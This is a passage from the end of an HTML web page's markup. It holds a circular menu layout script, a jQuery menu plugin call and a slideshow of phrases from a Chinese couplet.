        </div>
        
          <audio id="audio" src="#"></audio>
        
      </div> 
</div>
<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
    for (var i = 0,
    l = items.length; i < l; i++) {
      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
    }</script>
<script type="text/javascript">
  $(document).ready(function() {
    $('body').GalMenu({
      'menu': 'GalDropDown'
    })
  });
</script>

  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>
<script src="/js/script.js"></script>



  </div>
</body>
</html>